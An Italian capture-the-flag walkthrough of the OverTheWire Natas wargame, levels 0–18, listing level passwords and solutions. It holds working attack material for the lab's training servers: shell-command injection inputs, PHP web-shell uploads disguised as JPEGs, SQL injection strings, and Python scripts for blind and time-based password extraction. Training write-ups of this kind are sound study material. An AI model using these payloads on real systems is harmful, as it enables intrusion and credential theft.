# Natas 0::19
**TheHappyPietro**

[_gihub_](https://github.com)

[_instagram_](https://instagram.com)

[Natas](https://overthewire.org/wargames/natas/) è un wargame ideato da [OverTheWire](https://overthewire.org). Un wargame (o gioco di guerra) è una sfida di cyber-sicurezza in cui i concorrenti devono sfruttare o difendere una vulnerabilità in un sistema o in una applicazione. 
_Da [Wikipedia](https://en.wikipedia.org/wiki/Wargame_(hacking))._

## Natas 0 :: 1
> _User:_ natas0

> _Pass:_ natas0

> _URL:_ http://natas0.natas.labs.overthewire.org

Iniziamo! 

![Front Page: Natas0](https://i.ibb.co/F4F0D0H/natas0-1.png)


Una volta raggiunta la pagina ci trovereme un messaggio: «Puoi trovare la password in questa pagina». Non vedo nulla. Controlliamo meglio: _Tasto destro→Visualizza Sorgente Pagina._
Eccola!  


![Solution: Natas0](https://i.ibb.co/ckrDhMd/natas0-2.png)

## Natas 1 :: 2
> _User:_ natas1

> _Pass:_ gtVrDuiDfck831PqWsLEZy5gyDz1clto

> _URL:_ http://natas1.natas.labs.overthewire.org

![](https://i.postimg.cc/JnBNJHTG/natas1-1.png)

Come ci comunica il messaggio, la minestra è la stessa, il tasto destro è bloccato. Non può certo essere un problema! Con la combinazione **CTRL+C** (o un'altra delle tantissime), accediamo agli strumenti di sviluppo.
![](https://i.postimg.cc/jjnc612x/natas1-3.png)

Fatto!

## Natas 2 :: 3
> _User:_ natas2

> _Pass:_ ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi

> _URL:_ http://natas2.natas.labs.overthewire.org

![](https://i.postimg.cc/ydgN8FLr/natas3-1.png)

"Non c'è nulla in questa pagina". Per esserne sicuri, controlliamo: **CTRL+Shift+C**. 

![](https://i.postimg.cc/fbdFWyxf/natas2-2.png) 

Ma allora non è vero che non c'è nulla! il file _files/pixel.png_ contiene lettaralmente un singolo pixel. Nulla che ci possa essere di aiuto. Vediamo cosa altro contiene la cartella _files/_.

![](https://i.postimg.cc/FscDJ8fh/natas2-3.png)

Ecco! il file _users.txt_ contiene le credenziali di _natas3_

## Natas 3 :: 4
> _User:_ natas3

> _Pass:_ sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14

> _URL:_ http://natas3.natas.labs.overthewire.org

Questa volta il messaggio "_There is nothing on this page_" sempra avere del vero:

![](https://i.postimg.cc/5N0f45j5/natas3-2.png)

"_Nemmeno Google potrà trovarla questa volta_". Idea! Google non trova i file definiti in _robots.txt/_; quindi rechiamoci qui.

![](https://i.postimg.cc/1X4RjDqK/natas3-3.png)

Perfetto! Nessun crawler può trovare _s3cr3t/_. Ora noi l'abbiamo appena fatto.
_s3cr3t/_ contiene un solo file: _users.txt_; questo file contiene la pswd per natas4!

## Natas 4 :: 5
> _User:_ natas54

> _Pass:_ Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ

> _URL:_ http://natas4.natas.labs.overthewire.org

![](https://i.postimg.cc/BQVpk3d5/natas4-1.png)

La pagina ci avvisa, dicendoci che non abbiamo accesso alla pagina corrente, perché dobbiamo visitarla da "_http://natas5.natas..._". Classico esempio di utilizzo di riferenze nelle richieste HTTP. 
Procediamo aprendo il nostro [Burp Suite](https://portswigger.net/burp) e impostando il proxy creato da Burp sul nostro browser _[127.0.0.1:8080]_.

![](https://i.postimg.cc/fLVmxSR6/natas4-2.png)

Catturando la richiesta creata dal natas4 dovremmo ottenere un risultato simile. Tutto ciò che ci rimane da fare è modificare il parametro _Referer_, sostituendo l'URL sottolineato con quello di natas5 _http://natas5.natas.labs.overthewire.org_ e inoltrare la richiesta.

![](https://i.postimg.cc/yYjx8YV9/natas4-4.png)

Completato!

## Natas 5 :: 6
> _User:_ natas5

> _Pass:_ iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq

> _URL:_ http://natas5.natas.labs.overthewire.org


![](https://i.ibb.co/x2XxYrb/natas-5-1.png)

Eccoci arrivati al livello 5. La pagina però, ci dice che non siamo loggati.
Solitamente i login vengono gestiti dai cookie e talvolta anche da sessioni. 
Per risolvere questo livello possiamo usare un cookie manager qualunque, oppure possiamo usare Burp Suite, cURL...

![](https://i.postimg.cc/wMtT0x91/natas5-2.png)

Notiamo che esiste un cookie _loggedin_ impostato a _0_. Chiramente, per supererare il livello, basterà impostare il cookie a _1_ ed aggiornare la pagina.

![](https://i.postimg.cc/htnQPxSM/natas5-3.png)

Prossimo livello!

## Natas 6 :: 7
> _User:_ natas6

> _Pass:_ aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1

> _URL:_ http://natas6.natas.labs.overthewire.org

![](https://i.postimg.cc/ZqMq3yhG/natas6.png)

Come possiamo facilmente notare, potremo consultare il codice sorgente, cliccando sul link _View Sourcedoce_. 

```php
<?
include "includes/secret.inc";
if(array_key_exists("submit", $_POST)) {
    if($secret == $_POST['secret']) {
        print "Access granted. The password for natas7 is <censored>";
    } else {
        print "Wrong secret";
    }
}
?>
```

Questo è il codice PHP, la parte che interessa a noi. Notiamo che per ottenere la password dovremo prima scoprire il contenuto di _$secret_. Questa variabile non viene dichiarata da nessuna parte, percui, presumiamo sia contenuta il _"includes/secret.inc"_.

![](https://i.postimg.cc/Mp4km0vm/natas6-3.png)

Analizzando il codice sorgente di _'secret.inc'_ ci accorgiamo che le nostre deduzioni non erano infondate. Possiamo quindi copiare la chiave e incollarla nel campo _"inpur secret"_ in _index.php_ per ottenere la passwd di natas7.

![](https://i.postimg.cc/SKq6532S/natas6-4.png)

## Natas 7::8
> _User:_ natas7

> _Pass:_ 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9

> _URL:_ http://natas7.natas.labs.overthewire.org

![](https://i.postimg.cc/sDY9c3x6/natas7-1.png)

Qui avremo un menù con due indirizzi: home e about. Il primo porta a _index.php?page=home_, mentre il secondo a _index.php?page=about_.
Ora analizziamo il codice: 

![](https://i.postimg.cc/BvXKd3ZG/natas7-2.png)

Avrete già avuto la deduzione:

![](https://i.postimg.cc/ZKQZwzQN/natas7-3.png)

Esatto: impostiamo il valore _page_ a _/etc/natas_webpass/natas8_.

![](https://i.postimg.cc/k4gprB6g/natas7-4.png)

In questo caso lo script PHP che fa funzionare questo sito sarà circa:

```php
if(isset($_GET['page']))
    include_once $_GET['page'];
```

## Natas 8 :: 9
> _User:_ natas8

> _Pass:_ DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe

> _URL:_ http://natas8.natas.labs.overthewire.org

![](https://i.postimg.cc/LhFs0dC2/natas8-1.png)

```php
<?php
# Questa è la pswd criptata
$encodedSecret = "3d3d516343746d4d6d6c315669563362";
# Funzione per criptare il nostro input
function encodeSecret($secret) {
    return bin2hex(strrev(base64_encode($secret)));
}
if(array_key_exists("submit", $_POST)) {
    if(encodeSecret($_POST['secret']) == $encodedSecret) {
        print "Access granted. The password for natas9 is <censored>";
    } else {
        print "Wrong secret";
    }
}
```

Semplice, basta decriptare _$encodedSecret_. Come vediamo dalla funzione _encodeSecret_ il messaggio viene convertito in base 64, poi la stringa viene inverita e convertita in hex.
Scriviamo una programma per decompilare la passwd.

```php
<?php
echo base64_decode(strrev(hex2bin("3d3d516343746d4d6d6c315669563362")));
?>
```

Quindi eseguiamolo.

```bash
pietro@no-hostname:~$ php decrypt.php 
oubWYf2kBq
```

Inseriamo il codice ottenuto nel form.

![](https://i.postimg.cc/wv9WhpQK/natas8-2.png)

Fatto!

## Natas 9 :: 10
> _User:_ natas9

> _Pass:_ W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl

> _URL:_ http://natas9.natas.labs.overthewire.org


![](https://i.postimg.cc/dQLpsGnG/natas9-1.png)

Questo livello ci permette di cercare in un file varie parole:

![](https://i.postimg.cc/8z0rSQCR/natas9-2.png)

Il motore di questo sito:

```php
$key = "";
if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}
if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
```

Il comando grep ci permette di cercare file all'interno di un file.
Inserendo ```; cat /etc/natas_webpass/natas10 #``` otteremo il contenuto del file _natas10_, nonchè la password che stiamo cercando.

![](https://i.postimg.cc/Ss8Z9fPP/natas9-3.png)

## Natas 10 :: 11
> _User:_ natas9

> _Pass:_ W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl

> _URL:_ http://natas9.natas.labs.overthewire.org

![](https://i.postimg.cc/wxrGr3XF/natas10-1.png)

Sembra uguale al livello precedente, controlliamo il codice:

```php
$key = "";
if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}
if($key != "") {
    if(preg_match('/[;|&]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i $key dictionary.txt");
    }
}
```

Di nuovo, rispetto al livello precedente, ci sono poche righe di codice:

```php
if(preg_match('/[;|&]/',$key)) {
    print "Input contains an illegal character!";
} else {
    passthru("grep -i $key dictionary.txt");
}
```

Queste righe ci impediscono di utilizzare la tecnica precendente ed eseguire altri comandi (come cat). Leggendo la documentazione di [_Grep_](https://it.wikipedia.org/wiki/Grep) (o `$ man grep`), ci accorgiamo che l'opzione `-i` permette di trovare una parola in più file: `$ grep -i parola file1.txt file2.txt file3.txt`. Pertanto possiamo far cercare una determinata parola all'interno di più file: `*carattere* /etc/natas_webpass/natas11`, dove _*carattere\*_ è un carattere da cercare nei file; sostituiscilo quindi con un carattere o numero, finchè non ottieni la password. Il carattere deve essere contenuto dalla password.

![](https://i.postimg.cc/zvRMX1C9/natas10-2.png)

## Natas 11 :: 12
> _User:_ natas11

> _Pass:_ U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK

> _URL:_ http://natas11.natas.labs.overthewire.org

![](https://i.postimg.cc/RZ2KZMmM/natas11-2.png)

Questa volta avremo parecchio codice da analizzare!

```php
<?php

$defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");

function xor_encrypt($in) {
    $key = '<censored>';
    $text = $in;
    $outText = '';
    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }
    return $outText;
}

function loadData($def) {
    global $_COOKIE;
    $mydata = $def;
    if(array_key_exists("data", $_COOKIE)) {
        $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE["data"])), true);
        if(is_array($tempdata) && array_key_exists("showpassword", $tempdata) && array_key_exists("bgcolor", $tempdata)) {
            if (preg_match('/^#(?:[a-f\d]{6})$/i', $tempdata['bgcolor'])) {
                $mydata['showpassword'] = $tempdata['showpassword'];
                $mydata['bgcolor'] = $tempdata['bgcolor'];
            }
        }
    }
    return $mydata;
}

function saveData($d) {
    setcookie("data", base64_encode(xor_encrypt(json_encode($d))));
}

$data = loadData($defaultdata);
if(array_key_exists("bgcolor",$_REQUEST)) {
    if (preg_match('/^#(?:[a-f\d]{6})$/i', $_REQUEST['bgcolor'])) {
        $data['bgcolor'] = $_REQUEST['bgcolor'];
    }
}
saveData($data);
```

Dopo avere analizzato il codice, ci accorgeremo che ci occorre la chiave `$key` in `xor_encrypt` per poter ottenere la chiave.

'Ricicliamo' la funziona `xor_encrypt` e creiamo un nuovo file `xor_decrypt.php`:

```php
$_COOKIE['data'] = "ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw";
$defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");

function xor_encrypt($in) {
    $key = base64_decode($_COOKIE['data']);
    $text = $in;
    $outText = '';

    for($i = 0; $i < strlen($text); $i++) {
        $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

echo xor_encrypt(json_encode($defaultdata));
```

In questo modo riusciremo a ottenere la chiave dal cookie '_data_'.
Eseguendo `xor_decrypt.php` otteremo: 

```sh
pietro@no-hostname:~/Documenti/NATAS$ php xor_decrypt.php 
qw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jq
```

Ovvero '_qw8J_' ripetuto più volte.
_`qw8J`_ sarà la chiave XOR che utilizzeremo noi.
Quindi otteniamo il cookie criptato con la chiave XOR e che stampi la password:

```php
# ! Impostiamo 'showpassword' su 'yes'
$defaultdata = array( "showpassword"=>"yes", "bgcolor"=>"#ffffff");  
function xor_encrypt($in) {
    $key = "qw8J"; # Chiave
    $text = $in;
    $outText = '';

    for($i = 0; $i < strlen($text); $i++) {
        $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

echo base64_encode(xor_encrypt(json_encode($defaultdata)));
```

Eseguiamo:

```sh
pietro@no-hostname:~/Documenti/NATAS$ php natas11.php 
ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK
```

Ora impostiamo il risultato ottenuto come cookie su natas11 e ricarichiamo la pagina.

![](https://i.postimg.cc/TPmmyZ2n/natas11-1.png)

## Natas 12 :: 13
> _User:_ natas12

> _Pass:_ EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3

> _URL:_ http://natas12.natas.labs.overthewire.org

![](https://i.postimg.cc/1RLLZFnX/natas12-1.png)

Questa pagina ci consente di caricare delle immagini. Ma analizziamo il codice.

```php
<? 

function genRandomString() {
    $length = 10;
    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
    $string = "";    
    for ($p = 0; $p < $length; $p++) {
     project.mdproject.mdproject.mdproject.md   $string .= $characters[mt_rand(0, strlen($characters)-1)];
    }
    return $string;
}

function makeRandomPath($dir, $ext) {
    do {
        $path = $dir."/".genRandomString().".".$ext;
    } while(file_exists($path));
    return $path;
}

function makeRandomPathFromFilename($dir, $fn) {
    $ext = pathinfo($fn, PATHINFO_EXTENSION);
    return makeRandomPath($dir, $ext);
}

if(array_key_exists("filename", $_POST)) {
    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);
        if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
        echo "File is too big";
    } else {
        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
        } else{
            echo "There was an error uploading the file, please try again!";
        }
    }
} else { 
    *show form*
}
```

Capiamo subito che il file verrà caricato con una stringa randomica come nome e con un estensione _.jpeg_.
Facile da aggirare!
Creiamo un nuovo script: `payload.jpeg`.

```php
<?=shell_exec("cat /etc/natas_webpass/natas13");?>
```

Apriamo Burp Suite e colleghiamo il proxi `localhost:8080` al nostro browser. Carichiamo il nostro file `payload.jpeg`. Quindi osserviamo la richiesta ottenuta.

![](https://i.postimg.cc/bwb5YkN6/natas12-2.png)

Come vediamo il nostro file verrà caricato come file _.jpg_.
Tutto ciò che dovremo fare è cambiare l'estensione con cui viene caricato:

![](https://i.postimg.cc/m2KqG8Rz/natas12-3.png)

Potete notare che ho modificato l'estensione del file, da: _9ucvajejsk.jpg_ a _9ucvajejsk.php_. Quindi schiacciamo sul pulsante in alto a destra: Forward per far procedere la richiesta. Osserviamo il risultato sul browser.

![](https://i.postimg.cc/BQjyydWf/natas12-4.png)

Clicchiamo sul link:

![](https://i.postimg.cc/PJR7JMw7/natas12-5.png)

Ecco ottenuta la password per natas13.

## Natas 13 :: 14
> _User:_ natas13

> _Pass:_ jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY

> _URL:_ http://natas13.natas.labs.overthewire.org

![](https://i.postimg.cc/LshF9hwh/natas13-1.png)

Ancora una volta, controlliamo il codice per identificare le differenze nella versione precendente. 

```php
<?php

function genRandomString() {
    $length = 10;
    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
    $string = "";    
    for ($p = 0; $p < $length; $p++) {
        $string .= $characters[mt_rand(0, strlen($characters)-1)];
    }
    return $string;
}

function makeRandomPath($dir, $ext) {
    do {
        $path = $dir."/".genRandomString().".".$ext;
    } while(file_exists($path));
    return $path;
}

function makeRandomPathFromFilename($dir, $fn) {
    $ext = pathinfo($fn, PATHINFO_EXTENSION);
    return makeRandomPath($dir, $ext);
}

if(array_key_exists("filename", $_POST)) {
    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);
    $err=$_FILES['uploadedfile']['error'];
    if($err){
        if($err === 2){
            echo "The uploaded file exceeds MAX_FILE_SIZE";
        } else{
            echo "Something went wrong :/";
        }
    } else if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
        echo "File is too big";
    } else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
        echo "File is not an image";
    } else {
        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
        } else{
            echo "There was an error uploading the file, please try again!";
        }
    }
} else {
    *stampa il form*
}
?>
```

Quello che interessa particolarmente a noi è:

```php
} else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
    echo "File is not an image";
}
```

Qui lo script controlla la signature del file per scoprire se il file è effettivamente un'immagine o meno.
Creiamo quindi un nuovo script `payload.jpeg`.

```php
many_bits

<?=shell_exec("cat /etc/natas_webpass/natas13");?> 
```

La signature dei file jpg è: `FF D8 FF DB`.
Possiamo scoprirlo cercando su: _https://en.wikipedia.org/wiki/List_of_file_signatures_
Apriamo un editor esadecimale (come hexedit su linux o https://hexed.it/).

![](https://i.postimg.cc/gc7CsYwP/natas13-2.png)

Dovremo ritrovarci più o meno così.
Modifichiamo i primi valori (_6D 61 6E 79_) con quelli della signature jpg `FF D8 FF DB`.
Quindi:

![](https://i.postimg.cc/fy11RK4b/natas13-3.png)

Ora usciamo (_CTRL+X_) salvando il file (_y_).
E siamo pronti per eseguire l'esatta procedura per il precedente esercizio:
Carichiamo il file con il proxy Burp Suite collegato:

![](https://i.postimg.cc/3wKrhKCc/natas13-4.png)

![](https://i.postimg.cc/Hk0WFJ5M/natas13-5.png)

Click su `Forward`.

![](https://i.postimg.cc/fRQTH73Z/natas13-6.png)

Click sul link.

![](https://i.postimg.cc/gkZ2qt2N/natas13-7.png)

Bang!

## Natas 14 :: 15
> _User:_ natas14

> _Pass:_ Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1

> _URL:_ http://natas14.natas.labs.overthewire.org

![](https://i.postimg.cc/MpX2mv5x/natas14.png)

Con questo esercizio si intruce la tecninca del [_SQL Injection_](https://en.wikipedia.org/wiki/SQL_injection).
Il codice:

```php
<?
if(array_key_exists("username", $_REQUEST)) {
    $link = mysql_connect('localhost', 'natas14', '<censored>');
    mysql_select_db('natas14', $link);
    
    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    if(mysql_num_rows(mysql_query($query, $link)) > 0) {
            echo "Successful login! The password for natas15 is <censored><br>";
    } else {
            echo "Access denied!<br>";
    }
    mysql_close($link);
} else {
    *stampa il form*
}
?> 
``` 

Come vediamo lo script esegue la query SQL:

```php 
$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"$_REQUEST["password"]\"";
```

Dove `$_REQUEST['username']` e `$_REQUEST['password']` sono i valori immessi da noi nel form.
Possiamo quindi manipolare la query impostando username a `"ciao"` e password a `" OR 1=1 #`.
In questo la query diventerebbe:

```sql
SELECT * from users where username="ciao" and password="" OR 1=1# 
```

Ovvero: Seleziona Tutto dalla Tabella users Dove `username` è uguale a `ciao` e `password` è uguale a `null` oppure dove `1=1` (sempre vero). In parole pavore è: `Seleziona tutto`.

![](https://i.postimg.cc/MptLNxs5/natas14-2.png)

## Natas 15 :: 16
> _User:_ natas15

> _Pass:_ AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J

> _URL:_ http://natas15.natas.labs.overthewire.org

![](https://i.postimg.cc/QdN4pwXT/natas15-1.png)

Qui le cose iniziano a farsi più interessanti.
Il codice:

```php
<?

if(array_key_exists("username", $_REQUEST)) {
    $link = mysql_connect('localhost', 'natas15', '<censored>');
    mysql_select_db('natas15', $link);
    
    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    $res = mysql_query($query, $link);
    if($res) {
    if(mysql_num_rows($res) > 0) {
        echo "This user exists.<br>";
    } else {
        echo "This user doesn't exist.<br>";
    }
    } else {
        echo "Error in query.<br>";
    }

    mysql_close($link);
} else {
    *stampa il form*

?>
```

E la struttura del database:

```sql
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
```

Questa volta la pagina ci comunicherà soltanto se un utente esiste, o meno. 
Tutta via il sito è ancora vulnerabile a SQL injection.
Potremo usare un payload del tipo:
`natas16" and password like binary "%a%`
Che farebbe diventare la query:

```sql
SELECT * from users where username="natas16" and password like binary "%a%"
// Usiamo binary per fare distizione tra maiuscole e minuscole
```

Ovvero: Seleziona Tutte le Colonne dove `username` è uguale a `natas16` e dove `password` contine la lettera `a`.
Quindi creiamo un nuovo script python `enumerator.py`.

```python
import urllib.request as ulib

# base64 natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J
headers={"Authorization" : "Basic bmF0YXMxNTpBd1dqMHc1Y3Z4clppT05nWjlKNXN0TlZrbXhkazM5Sg=="}
url = "http://natas15.natas.labs.overthewire.org/index.php"
alfanum = "qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890"
password = ""

for k in range(32): # Lunghezza della password
    for i in alfanum:
        print(f"Password: {password}; Try with: {i}", end="\r")
        request = url+'?username=natas16"+and+password+like+binary+"'+password+i+'%'
        payUrl = ulib.Request(url=request, headers=headers)
        if ulib.urlopen(payUrl).read().find(b'This user exists.') != -1:
            password += i
print("\n"+password)
```

Per installare la libreria `urllib`:

```sh
$ pip3 install urllib
```

Lanciamo il programma e attendiamo qualche minuto:

```sh
pietro@no-hostname:~$ /usr/bin/python enumerator.py
WaIHEacj63wnNIBROHeqi3p9t0m5nhmhp9t0m5nhmh; Try with: 0
WaIHEacj63wnNIBROHeqi3p9t0m5nhmhp9t0m5nhmh
```

Il risultato sarà la password `natas16`.

## Natas 16 :: 17
> _User:_ natas16

> _Pass:_ WaIHEacj63wnNIBROHeqi3p9t0m5nhmh

> _URL:_ http://natas16.natas.labs.overthewire.org

Questo livello è molto simile al precendete.

![](https://i.postimg.cc/qM1sQ65m/natas16-1.png)

Il codice:

```php
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&`\'"]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i \"$key\" dictionary.txt");
    }
}
?>
```

Il codice è stato implementato con un filtro: ```preg_match('/[;|&`\'"]/',$key)```. Questo ci costringerà ad elaborare una nuova tecnica. Come: `$(comando)`:

```sh
grep -i $(grep ^a /etc/natas_webpass/natas17)loll dictionary.txt
```

Bash eseguirà prima il comando all'interno delle parentesi; questo ritornerà 'a' se il file `natas17` contiene la letterà 'a'. Successivamente verrà eseguito il comando 'contenitore' che sarà diventato: `grep -i aloll dictionary.txt`, sempre se la password contiene la letterà 'a', altrimenti il comando resterà: `grep -i loll dictionary.txt`.
Possiamo quindi creare un script `enumerator.py` che enumeri la password:

```py
import urllib.request as ulib

# base64 natas16:WaIHEacj63wnNIBROHeqi3p9t0m5nhmh
headers={"Authorization" : "Basic bmF0YXMxNjpXYUlIRWFjajYzd25OSUJST0hlcWkzcDl0MG01bmhtaA=="}
url = "http://natas16.natas.labs.overthewire.org/index.php"
alfanum = "qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890"
password = ""

for k in range(32): # Lunghezza della password
    for i in alfanum:
        print(f"Password: {password}; Try with: {i}", end="\r")
        request = url+'?needle=$(grep+^'+password+i+'+/etc/natas_webpass/natas17)loll'
        payUrl = ulib.Request(url=request, headers=headers)
        if b'lolling' not in ulib.urlopen(payUrl).read():
            password += i
print("\n"+password)
```

Si, è molto simile al precedente, cambia sostanzialmente solo la richiesta. 
Eseguendolo e attendendo pochi attimi:

```
pietro@no-hostname:~$ /usr/bin/python enumerator.py
Password: 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw; Try with: 0
8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw
```
Finito.

## Natas 17 :: 18
> _User:_ natas17

> _Pass:_ 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw

> _URL:_ http://natas17.natas.labs.overthewire.org

![](https://i.postimg.cc/QdL5dLH3/natas18-1.png)

```php
<?php
if(array_key_exists("username", $_REQUEST)) {
    $link = mysql_connect('localhost', 'natas17', '<censored>');
    mysql_select_db('natas17', $link);
    
    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }
    $res = mysql_query($query, $link);
    if($res) {
        if(mysql_num_rows($res) > 0) {
            //echo "This user exists.<br>";
        } else {
            //echo "This user doesn't exist.<br>";
        }
    } else {
        //echo "Error in query.<br>";
    }
    mysql_close($link);
} else {
    *stampa il form*
}
?> 
```
```sql
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
); 
```

Questo codice l'abbiamo già visto nell'esercizio 15. Con una differenza, però:

```php
if(mysql_num_rows($res) > 0) {
    //echo "This user exists.<br>";
} else {
    //echo "This user doesn't exist.<br>";
}
```

Tutti gli output sono stati commentati, in questo modo non avremo alcun ritorno, e non potremo attuare la metodologia usata nell'esercizio 15. Dobbiamo trovare un modo con cui SQL possa darci un ritorno. L'unico comando SQL che mi viene in mente che possa esserci utile è `sleep()`. Questo comando ferma per n secondi l'esecuzione dello script, questo potrà poi ripartire. Quindi:

```sql
SELECT * from users where `username` = "natas18" and sleep(if(`password` like binary "a%", 4, 0)
```

Tramite il riconoscimento degli errori dovremmo essere in grado di determinare se una stringa è contenuta dalla password.
Creiamo un nuovo file python, `enumerator.py`:

```py
import urllib.request as ulib
import time

# base64 natas17:8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw
headers={"Authorization" : "Basic bmF0YXMxNzo4UHMzSDBHV2JuNXJkOVM3R21BZGdRTmRraFBrcTljdw=="}
url = "http://natas17.natas.labs.overthewire.org/index.php"
alfanum = "qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890"
password = ""

# natas18" and sleep(if(`password` like binary 'a%', 5, 0))#
for k in range(32): # Lunghezza della password
    for i in alfanum:
        print(f"Password: {password}; Try with: {i}", end="\r")
        try:
            request = url+'?username=natas18"+and+sleep(if(password+like+binary+"'+password+i+'%",4,0))%23'
            payUrl = ulib.Request(url=request, headers=headers)
            ulib.urlopen(payUrl, timeout=1.5).read()
        except IOError: 
            password += i
            time.sleep(1)
        
print("\n"+password)
```

Eseguendolo:

```
pietro@no-hostname:~$ /usr/bin/python enumerator.py
Password: xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP; Try with: 0
xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP
```
L'operazione potrà essere leggermente più lenta delle precedenti. Se dopo vari tentativi l'enumerazione fallisce, prova ad aumentare il timeout.

## Natas 18 :: 19
> _User:_ natas18

> _Pass:_ xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP

> _URL:_ http://natas18.natas.labs.overthewire.org

![](https://i.postimg.cc/7Lgr63RK/natas18-1.png)

```php
<?

$maxid = 640; // 640 should be enough for everyone

function isValidAdminLogin() {
    if($_REQUEST["username"] == "admin") {
    /* This method of authentication appears to be unsafe and has been disabled for now. */
        //return 1;
    }

    return 0;
}

function isValidID($id) {
    return is_numeric($id);
}

function createID($user) { /* {{{ */
    global $maxid;
    return rand(1, $maxid);
}

function debug($msg) { 
    if(array_key_exists("debug", $_GET)) {
        print "DEBUG: $msg<br>";
    }
}

function my_session_start() { 
    if(array_key_exists("PHPSESSID", $_COOKIE) and isValidID($_COOKIE["PHPSESSID"])) {
        if(!session_start()) {
            debug("Session start failed");
            return false;
        } else {
            debug("Session start ok");
            if(!array_key_exists("admin", $_SESSION)) {
                debug("Session was old: admin flag set");
                $_SESSION["admin"] = 0; // backwards compatible, secure
            }
            return true;
        }
    }
    return false;
}

function print_credentials() {
    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
        print "You are an admin. The credentials for the next level are:<br>";
        print "<pre>Username: natas19\n";
        print "Password: <censored></pre>";
    } else {
        print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas19.";
    }
}

$showform = true;
if(my_session_start()) {
    print_credentials();
    $showform = false;
} else {
    if(array_key_exists("username", $_REQUEST) && array_key_exists("password", $_REQUEST)) {
        session_id(createID($_REQUEST["username"]));
        session_start();
        $_SESSION["admin"] = isValidAdminLogin();
        debug("New session started");
        $showform = false;
        print_credentials();
    }
} 

if($showform) { 
    *stampa il form*
}
?>
```
